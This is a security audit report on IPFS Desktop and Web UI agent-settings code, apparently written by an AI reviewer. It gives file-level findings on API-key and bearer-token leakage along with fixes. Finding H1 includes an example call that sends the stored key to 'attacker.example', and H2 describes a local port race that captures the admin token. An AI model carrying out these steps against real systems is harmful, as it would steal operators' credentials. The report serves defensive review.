# Security findings: agent-backend-settings Round 5 (Web UI and Desktop)

Reviewer: `security-reviewer` (Claude Opus, independent context, read-only). Date: 2026-10-14. Static reading only. Written to disk by the lead from the returned report. H1 (server attaches the stored key in `probeOpenAIModels` for any candidate) and H2 (`getState()` returns `running` when `child` is set) confirmed by the lead in the code.

Scope: IPFS Desktop `desktop-agent-settings-bridge` (`src/agent/{settings-api,settings-service,settings-bridge,sidecar-registry,sidecar-watch,tray-menu,bridge,consts}.js`, `src/webui/{index,preload,security}.js`, `src/daemon/{mcp-sidecar,index}.js`); Web UI `src/settings/agent/**`, `src/agent-chat/{settings-store,endpoint}.js`, `src/bundles/routes.js`; island `mcp/chat/src/agui/client.ts`, `BackendEmpty.tsx`; server read for reference (`mcp/server/settings.go`, `settings_probe.go`).

**Verdict: FAIL** (H1, H2). M1 must be fixed alongside; M2 and M3 in the same cycle.

## Threat model

Assets: the operator's model API key (safeStorage; reaches the child only as `IPFS_MCP_DESKTOP_LLM_API_KEY`); the `desktop-admin` bearer (safeStorage; child env and main-process fetch); the Web UI admin bearer (memory, sessionStorage opt-in); the backend host and egress choice. Adversaries: script in the Web UI main frame; a local process that can bind loopback ports; operator mistype or social engineering; a framing page; untrusted server text.

## Findings

### H1 HIGH: test connection sends the stored model key to any https host

- Desktop `src/agent/settings-service.js:375-399` (`testConnection`) has no `authenticate` call; `validateTestConnection` (`:128-141`, `CANDIDATE_URL` `:24`) accepts any https host; `listModels` follows (`:387`). Web UI `src/settings/agent/AgentSettings.js:100-115`, `OpenAiBackendForm.js:33,53`: button enabled once the URL parses. Server `kubo/mcp/server/settings_probe.go:86-87`, `:120-121` call `probeOpenAIModels(ctx, candidate, h.st.storedKey())`; `:210-212` set `Authorization: Bearer <key>`; no check against the current backend host or `effectiveAck`.
- Scenarios: renderer script calls `testConnection({base_url: 'https://attacker.example'})` and the key goes there with no Touch ID; a person tests a lookalike host. Touch ID and the server egress check protect node content moves, not the key.
- Fix: server attaches the stored key only when the candidate host equals the current backend host or is in the caller's acknowledged hosts; otherwise probe without `Authorization` and report 401/403 as "reachable; the stored key is not sent to an unconfirmed host". Desktop interim: Touch ID naming the host when the candidate differs from the current backend. Tests per transport proving no `Authorization` to a new host.

### H2 HIGH: Desktop sends the admin bearer to the sidecar port before the child binds it

- `src/daemon/mcp-sidecar.js:654-658` reports `running` once `child` is set (`:437`, right after spawn), not after the bound-address line (`:402-419`; kubo prints it after `hs.Listen()`, `cmd/ipfs/kubo/mcp_http.go:275-288`). `src/webui/index.js:243-246` builds the base URL on `running`; the event pump (`:304-307`) and `restartSidecar` polling (`settings-service.js:304-311`) send `Authorization: Bearer <admin>` at once (`settings-api.js:163-173`). Port discovery is check-then-use (`:201-208`); on macOS a specific-address probe can succeed while another process holds `0.0.0.0:5050`. The admin token is never rotated (`:99-105`).
- Scenario: a local process on `*:5050` or racing to bind 127.0.0.1:5050 receives the permanent admin bearer during child startup, then steals the key via H1 or moves the backend with a self-supplied `egress_confirmation` (`settings.go:535-547`).
- Fix: a `starting` state until the child's bound-address report; gate `sidecarBaseUrl`, the event pump and `restartSidecar` on it; a fresh admin token per spawn; unit test that no settings call happens before the bound line.

### M1 MEDIUM: without Touch ID a backend or egress change proceeds with no independent human confirmation

- `settings-service.js:351-359` logs and proceeds when Touch ID is unavailable; `src/agent/confirm/touchid.js:2-6` (operator decision 2026-10-12) makes the confirmation window refuse without Touch ID, so the gates disagree. The typed confirmation (`ipfs-webui/src/settings/agent/core/form.js:189-221`) and `egress_confirmation.host` both come from the renderer. Touch ID is absent on Mac mini/Studio/Pro, iMacs without the keyboard, clamshell MacBooks, or with no enrolled finger.
- Fix: a native main-process `dialog.showMessageBox` parented to the window naming the host, Cancel default; or fail closed like the confirmation window. Keep the warning log.

### M2 MEDIUM: off switch `agentSettings.enabled` undocumented

- Defined in `src/agent/consts.js:19-25`, read at `src/webui/index.js:233`; `docs/agent/HARDENING.md` has no `agentSettings` or `mcpSidecar.enabled`. Fix: document both (what false removes, how to set).

### M3 MEDIUM: Web UI admin bearer not bound to its node

- `use-settings-client.js:20-26` rebuilds the client from the chat endpoint with the same token; `ConnectionSection.js:45-51` keeps the token on endpoint change; `core/admin-token.js` stores no origin. Fix: store the root with the token, refuse other roots, forget on endpoint change.

### L1 LOW: key restart toggles the persisted off switch (`settings-service.js:295-302`, `mcp-sidecar.js:622-629`, `src/daemon/index.js:27-33`). Fix: a supervisor `restart()` that does not touch the store.

### L2 LOW: "keep for this tab" puts the admin bearer in origin-shared sessionStorage (`core/admin-token.js:28-35,47-52`). Fix: say so in `admin.keep.help` or drop the opt-in on origins that also serve content.

### L3 LOW (investigate): framing of `#/settings/agent` on the kubo-served Web UI (Desktop has `frame-ancestors 'none'`, `security.js:124`); one-click key removal is clickjackable if framed. CSRF not possible (`credentials: 'omit'` plus bearer).

### L4 LOW: window recreation adds a `before-quit` listener each time (`src/webui/index.js:191-196`, `:357-369`); `ctx.setProp('webui', window)` (`:237`) not updated.

### I1 INFO: contract error `details` passed through unfiltered (`settings-api.js:57`); keep only `current_revision` and `host`.

### I2 INFO: response size checked after buffering (`settings-api.js:65-70`).

## Judged design questions

- Touch ID unavailable → typed confirmation plus server egress check: rejected (M1).
- Renderer cannot widen the CSP (`security.js:79-92,103-126,136-145`; test `agent-settings-bridge.spec.js:156-185`).
- A local process cannot steer the window through the port parser (anchored, current child, once); H2 leaks the token, not the window.

## Verified controls

IPC trust to the main frame only; push events revision-only to the trusted frame; preload API only with the flag, frozen, no key getter; off switch removes flag, handlers and stream (undocumented, M2); closed request validation; whitelisted read shape; key never logged or echoed on Desktop (except H1 egress); safeStorage ciphertext with fail-closed start; allowlisted child env with secrets last; main-process client pinned to `127.0.0.1:<port>` with no redirects and timeouts (except H2 timing); webview hardening; punycode-normalised host in Touch ID; Web UI token memory by default (L2, M3); Web UI HTTP bearer only, `credentials: 'omit'`, `redirect: 'error'`, `no-referrer`; typed re-confirmation is UX, not a boundary (M1); no XSS sinks under `src/settings/agent` or `src/agent-chat`; island reads only `error.code` on 503; no new tracking.

## MCP summary

Client side. Command injection, eval, path traversal: safe. SSRF: at risk (H1). OWASP MCP01: FAIL (H1, H2). MCP07: FAIL on Desktop (M1).

## Manual follow-ups

1. Confirm on macOS arm64 that the loopback probe succeeds while another process holds `0.0.0.0:5050`.
2. Check `X-Frame-Options`/`frame-ancestors` on the kubo-served Web UI (L3).
3. The Go review confirms the H1 server fix and whether the admin kind's self-supplied `egress_confirmation` is acceptable once Desktop owns the human gate (M1).
